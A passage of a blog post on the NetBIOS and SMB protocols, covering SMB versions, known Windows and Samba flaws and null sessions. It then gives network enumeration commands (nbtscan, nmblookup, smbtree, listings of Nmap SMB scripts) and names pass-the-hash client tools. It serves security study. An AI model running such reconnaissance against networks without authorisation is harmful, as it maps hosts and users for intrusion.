<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.3.1" /><meta property="og:title" content="Protocol Dissection :- NetBIOS &amp; SMB" /><meta property="og:locale" content="en" /><meta name="description" content="This article examines the two protocols NetBIOS and SMB. SMB ran on top of the NetBIOS protocol in early versions of Windows, but eventually moved to its own dedicated TCP port. While NetBIOS is the older protocol, understanding both is nearly essential for understanding Windows network communications. The SMB protocol enables networked computers applications and services to communicate via Inter Process Communication (IPC) and to share files." /><meta property="og:description" content="This article examines the two protocols NetBIOS and SMB. SMB ran on top of the NetBIOS protocol in early versions of Windows, but eventually moved to its own dedicated TCP port. While NetBIOS is the older protocol, understanding both is nearly essential for understanding Windows network communications. The SMB protocol enables networked computers applications and services to communicate via Inter Process Communication (IPC) and to share files." /><link rel="canonical" href="http://theevilsaint.github.io/posts/protocol-dissection-netbios-smb/" /><meta property="og:url" content="http://theevilsaint.github.io/posts/protocol-dissection-netbios-smb/" /><meta property="og:site_name" content="EvilSaint" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-01-28T00:00:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Protocol Dissection :- NetBIOS &amp; SMB" /><meta name="twitter:site" content="@_evilsaint_" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-01-28T00:00:00+00:00","datePublished":"2022-01-28T00:00:00+00:00","description":"This article examines the two protocols NetBIOS and SMB. SMB ran on top of the NetBIOS protocol in early versions of Windows, but eventually moved to its own dedicated TCP port. While NetBIOS is the older protocol, understanding both is nearly essential for understanding Windows network communications. The SMB protocol enables networked computers applications and services to communicate via Inter Process Communication (IPC) and to share files.","headline":"Protocol Dissection :- NetBIOS &amp; SMB","mainEntityOfPage":{"@type":"WebPage","@id":"http://theevilsaint.github.io/posts/protocol-dissection-netbios-smb/"},"url":"http://theevilsaint.github.io/posts/protocol-dissection-netbios-smb/"}</script><title>Protocol Dissection :- NetBIOS & SMB | EvilSaint</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="EvilSaint"><meta name="application-name" content="EvilSaint"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="https://evilsaint.com/static/images/evilsaint_shield_logo.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title"> <a href="/">EvilSaint</a></div><div class="site-subtitle font-italic">I void warranties</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://twitter.com/_evilsaint_" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="https://evilsaint.com/subscribe" aria-label="youtube" target="_blank" rel="noopener"> <i class="fab fa-youtube"></i> </a> <a href="https://github.com/TheEvilSaint" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a> <a href="https://www.instagram.com/therealevilsaint/" aria-label="instagram" target="_blank" rel="noopener"> <i class="fab fa-instagram"></i> </a> <a href="https://www.facebook.com/TheEvilSaint/" aria-label="facebook" target="_blank" rel="noopener"> <i class="fab fa-facebook"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Protocol Dissection :- NetBIOS & SMB</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Protocol Dissection :- NetBIOS & SMB</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1643328000" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jan 28, 2022 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://www.twitter.com/_evilsaint_/">evilsaint</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2419 words"> <em>13 min</em> read</span></div></div></div><div class="post-content"><p>##What is NetBIOS?</p><p>NetBIOS is an acronym for Network Basic Input/Output System. It provides services related to the session layer of the OSI model, allowing applications on separate computers to communicate over a local area network.</p><p>NetBIOS is an API and not a networking protocol.</p><p>##How does NetBIOS operate?</p><p>Older operating systems ran NetBIOS using the NetBIOS Frames (NBF) and NetBIOS over IPX/SPX (NBX) protocols.</p><p>In modern networks, NetBIOS normally runs over TCP/IP via the NetBIOS over TCP/IP (NBT) protocol. This results in each computer in the network having both an IP address and a NetBIOS name corresponding to a (possibly different) host name.</p><p>##What are the benefits of NetBIOS?</p><p>NetBIOS provides three distinct services:</p><ul><li>Name service (NetBIOS-NS) for name registration and resolution.<li>Datagram distribution service (NetBIOS-DGM) for connectionless communication.<li>Session service (NetBIOS-SSN) for connection-oriented communication.</ul><p>##What is SMB?</p><p>N.B. SMB, an upper layer, is a service that runs on top of the Session Service and the Datagram service, and is not to be confused as a necessary and integral part of NetBIOS itself. It can now run atop TCP with a small adaptation layer that adds a packet length to each SMB message; this is necessary because TCP only provides a byte-stream service with no notion of packet boundaries</p><p>##How does SMB operate?</p><p>SMB can run on top of the Session (and lower) network layers in several ways:</p><ul><li>Directly over TCP, port 445<li>Via the NetBIOS API on UDP ports 137, 138 &amp; TCP ports 137, 139 (NetBIOS over TCP/IP);</ul><p>##What are the benefits of SMB?</p><p>The SMB “Inter-Process Communication” (IPC) system provides named pipes and was one of the first inter-process mechanisms widely available to programmers, allowing services to inherit the authentication performed when a client first connected to an SMB server.</p><p>Since Windows 2000, SMB has been running with a thin layer on top of TCP, similar to the Session Message packet of NBT’s Session Service, using TCP port 445 rather than TCP port 139; this is known as “direct host SMB.”</p><h2 id="smb-versions"><span class="mr-2">SMB Versions</span><a href="#smb-versions" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="version-summary"><span class="mr-2">Version Summary:</span><a href="#version-summary" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li>SMB1 – Windows 2000, XP and Windows 2003.<li>SMB2 – Windows Vista SP1 and Windows 2008<li>SMB2.1 – Windows 7 and Windows 2008 R2<li>SMB3 – Windows 8 and Windows 2012.</ul><h3 id="smb-20"><span class="mr-2">SMB 2.0</span><a href="#smb-20" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Microsoft introduced a newer version of the protocol (SMB 2.0 or SMB2) with Windows Vista in 2006</p><h3 id="smb-21"><span class="mr-2">SMB 2.1</span><a href="#smb-21" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>With Windows 7 and Server 2008 R2, a new opportunistic locking mechanism was introduced, resulting in minor performance improvements.</p><h3 id="smb-30-previously-smb-22"><span class="mr-2">SMB 3.0 (previously SMB 2.2)</span><a href="#smb-30-previously-smb-22" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Was introduced with Windows 8 and Windows Server 2012.</p><h3 id="smb-302"><span class="mr-2">SMB 3.0.2</span><a href="#smb-302" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Introduced with Windows 8.1 and Windows Server 2012 R2. In 3.0.2, the earlier SMB version 1 can be optionally disabled to increase security.</p><h3 id="smb-311"><span class="mr-2">SMB 3.1.1</span><a href="#smb-311" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Debuted alongside Windows 10 and Windows Server 2016. This version adds AES 128 GCM encryption to the AES 128 CCM encryption introduced in SMB3, as well as a pre-authentication integrity check using the SHA-512 hash. SMB 3.1.1 also requires secure negotiation when connecting to clients that use SMB 2.x or higher.</p><h2 id="security-flaws-windows"><span class="mr-2">Security Flaws Windows</span><a href="#security-flaws-windows" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>There have been numerous security flaws in Microsoft’s implementation of the protocol or the components on which it directly relies over the years. Other vendors’ security flaws stem primarily from a lack of support for newer authentication protocols such as NTLMv2 and Kerberos in favour of NTLMv1, LanMan, or plaintext passwords. Real-time attack tracking reveals that SMB is a primary attack vector for intrusion attempts, such as the Sony Pictures attack in 2014.</p><p>NetBIOS is effectively becoming a legacy protocol in client-server networks based on post-MS Windows 2000 / NT. NetBIOS was also designed for non-routable local area networks. NetBIOS effectively provides backwards compatibility for network devices that predate DNS compatibility in most post-2000 networks running Windows 2000 or later. NetBIOS’s primary role in Client-Server networks (as well as those with networked peripheral hardware that predates DNS compatibility) is to provide name resolution to computers and networked peripherals. Furthermore, it enables the access and sharing of networked hardware, as well as the mapping and browsing of network folders, shares, and shared printers, faxes, and so on. Its primary function is to provide name resolution to a computer and shared folders via a session-layer protocol transported over TCP/IP. As a result, Windows 2000-based Client-Server networks - and later - do not require this insecure method of name resolution, addressing, or navigating network shares.</p><h2 id="security-flaws-in-samba"><span class="mr-2">Security Flaws in Samba:</span><a href="#security-flaws-in-samba" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Some versions of Samba 3.6.3 and lower have serious security flaws that can allow anonymous users to gain root access to a system via an anonymous connection by exploiting an error in Samba’s remote procedure call.</p><p>Badlock, a critical security flaw in Windows and Samba, was publicly disclosed on April 12, 2016. CVE-2016-2118 mentions Badlock for Samba (SAMR and LSA person-in-the-middle attacks are possible).</p><h2 id="null-sessions"><span class="mr-2">Null Sessions</span><a href="#null-sessions" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li>In Windows 2000 and Windows NT, null sessions are enabled by default.<li>They are also enabled by default in Windows XP and Windows 2003 Server, but they do not support user account enumeration.</ul><h2 id="smb-programs"><span class="mr-2">SMB Programs</span><a href="#smb-programs" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>smbcacls - Set or get ACLs on an NT file or directory names</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>/usr/bin/smbcacls  
</pre></table></code></div></div><p>smbclient - ftp-like client to access SMB/CIFS resources on servers</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>/usr/bin/smbclient
</pre></table></code></div></div><p>smbcontrol - send messages to smbd, nmbd or winbindd processes</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>/usr/bin/smbcontrol  
</pre></table></code></div></div><p>smbcquotas - Set or get QUOTAs of NTFS 5 shares</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>/usr/bin/smbcquotas  
</pre></table></code></div></div><p>smbget - wget-like utility for download files over SMB</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>/usr/bin/smbget  
/usr/bin/smbmap  
</pre></table></code></div></div><p>smbpasswd - The Samba encrypted password file<br /> smbpasswd - change a user’s SMB password</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>/usr/bin/smbpasswd  
</pre></table></code></div></div><p>smbspool - send a print file to an SMB printer</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>/usr/bin/smbspool  
</pre></table></code></div></div><p>smbstatus - report on current Samba connections</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>/usr/bin/smbstatus  
</pre></table></code></div></div><p>smbtar - smbtar - shell script for backing up SMB/CIFS shares directly to UNIX tape drives</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>/usr/bin/smbtar  
</pre></table></code></div></div><p>smbtree - A text based smb network browser</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>/usr/bin/smbtree  
</pre></table></code></div></div><p>Others:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>/usr/bin/dceoversmb   
/usr/bin/pth-smbclient  
/usr/bin/pth-smbget  
</pre></table></code></div></div><h2 id="smbtree"><span class="mr-2">Smbtree</span><a href="#smbtree" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Show smbtree version</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>smbtree <span class="nt">--version</span>  
</pre></table></code></div></div><p>Show all workgroups</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>smbtree  
</pre></table></code></div></div><h2 id="nbtscan-vs-nbtstat"><span class="mr-2">Nbtscan vs Nbtstat</span><a href="#nbtscan-vs-nbtstat" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The difference between nbtstat and nbtscan in Windows is that nbtscan can work with multiple IP addresses.</p><p>To determine the meaning of each service in the NetBIOS report, visit Microsoft Knowledge Based on NetBIOS Suffixes (16th Character of the NetBIOS Name) at:</p><ul><li>https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-brws/0c773bdd-78e2-4d8b-8b3d-b7506849847b</ul><h3 id="nbtscan"><span class="mr-2">Nbtscan</span><a href="#nbtscan" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>nbtscan is an abbreviation for ‘NetBIOS over TCP scanner.</p><p>This is a command-line tool that searches for open NetBIOS nameservers on a local or remote TCP/IP network, which is the first step in discovering open shares. It is based on the functionality of the standard Windows tool nbtstat, but instead of just one address, it operates on a range of addresses.</p><h4 id="scanning-the-network"><span class="mr-2">Scanning the network</span><a href="#scanning-the-network" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>This scan will return the IP address of the computer(s), the NetBIOS name, the current logged in user, and the mac address of all NetBIOS on the local subnet.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>nbtscan 10.11.1.1-254
nbtscan 110.11.1.0/24
</pre></table></code></div></div><h4 id="examining-one-host"><span class="mr-2">Examining one host</span><a href="#examining-one-host" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Once we have decided on a host, we can enter just one host for more information.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nbtscan <span class="nt">-hv</span> 10.11.1.5
</pre></table></code></div></div><p>The <code class="language-shell highlighter-rouge"><span class="nt">-h</span></code> makes the output services human-readable and the <code class="language-shell highlighter-rouge"><span class="nt">-v</span></code> gives a verbose output.</p><p>If instead you would like to see a dump of the packets you can use the <code class="language-shell highlighter-rouge"><span class="nt">-d</span></code> option but it <strong>can not</strong> be used with the <code class="language-shell highlighter-rouge"><span class="nt">-v</span></code> or <code class="language-shell highlighter-rouge"><span class="nt">-d</span></code>.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nbtscan <span class="nt">-d</span> 10.11.1.5
</pre></table></code></div></div><p>Sometimes you may want to grep the results and so the -s flag can come in handy to put a separator between the fields.</p><p>Pipe as a separator:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nbtscan <span class="nt">-vh</span> <span class="nt">-s</span> <span class="s2">"|"</span> 10.11.1.0/24
</pre></table></code></div></div><p>Colon as a separator:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nbtscan <span class="nt">-vh</span> <span class="nt">-s</span> : 192.168.1.0/24
</pre></table></code></div></div><p>Finally, we may want to enter the IP addresses of hosts to scan, which we can do as follows.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nbtscan <span class="nt">-f</span> iplist.txt
</pre></table></code></div></div><h4 id="additional-flags"><span class="mr-2">Additional Flags</span><a href="#additional-flags" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>As per the man page, the following three flags sometimes can be useful.</p><p>Bandwidth output throttling. Slow down output so that it uses no more that bandwidth bps. Useful on slow links, so that outgoing queries do not get dropped.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nbtscan <span class="nt">-b</span> 1000 10.11.1.5
</pre></table></code></div></div><p>Use local port 137 for scans. Win95 boxes respond to this only. You need to be root to use this option on Unix.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nbtscan <span class="nt">-r</span> 10.11.1.0/24
</pre></table></code></div></div><p>Suppress banners, headers and error messages.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nbtscan <span class="nt">-q</span> 10.11.1.0/24
</pre></table></code></div></div><h2 id="nmblookup"><span class="mr-2">Nmblookup</span><a href="#nmblookup" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Use this on a single IP address for greater detail following the nbtscan.</p><p>Do a node status on <name> as an IP address:</name></p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nmblookup <span class="nt">-A</span> &lt;ip address&gt;
</pre></table></code></div></div><p>To find the IP address of a computer given its computer name, we can use:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nmblookup &lt;computer name&gt;
</pre></table></code></div></div><p>To find the group the computer belongs to and its MAC address:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nmblookup <span class="nt">-S</span> &lt;computer name&gt;
</pre></table></code></div></div><p>For example, lines containing ‘&lt;00&gt;’ in the output of ‘nmblookup -S <computer name="">' can be interpreted as follows. The one that is not followed by group is the computer name, and the one that is is the workgroup name to which this computer belongs.</computer></p><p>To find IP addresses of all computers in a workgroup, we can use:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nmblookup &lt;workgroup name&gt;
</pre></table></code></div></div><p>If we want computer names along with IP addresses, then we can use:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nmblookup <span class="nt">-S</span> &lt;workgroup name&gt;
</pre></table></code></div></div><h3 id="workgroup-flags"><span class="mr-2">Workgroup Flags</span><a href="#workgroup-flags" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li>workgroup <code class="language-shell highlighter-rouge">&lt;00&gt;</code> group - This name is a remnant of the original LAN Manager browse service.<li>workgroup <code class="language-shell highlighter-rouge">&lt;1D&gt;</code> unique - This name identifies the Local Master Browser (LMB, sometimes called simply “Master Browser”) for a subnet.<li>workgroup <code class="language-shell highlighter-rouge">&lt;1E&gt;</code> - group A node that is capable of acting as a “Browser” registers this group name to listen for election announcements.<li>nt_domain <code class="language-shell highlighter-rouge">&lt;1B&gt;</code> unique Name registered by the Domain Master Browser. Must be registered with the NBNS in order to be of any real use.<li>nt_domain <code class="language-shell highlighter-rouge">&lt;1C&gt;</code> Internet group Registered by all Domain Controllers in the given NT Domain.</ul><h2 id="nmap"><span class="mr-2">Nmap</span><a href="#nmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Nmap scripts for SMB are located at:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nb">ls</span> <span class="nt">-l</span> /usr/share/nmap/scripts/smb<span class="k">*</span>
<span class="nb">ls</span> <span class="nt">-lsa</span> /usr/share/nmap/scripts | <span class="nb">grep</span> <span class="s2">"smb"</span>
<span class="nb">ls</span> /usr/share/nmap/scripts | <span class="nb">grep</span> <span class="s2">"smb"</span> | <span class="nb">sed</span> <span class="s2">"s/.nse/,/"</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s2">"</span><span class="se">\n\r</span><span class="s2">"</span>
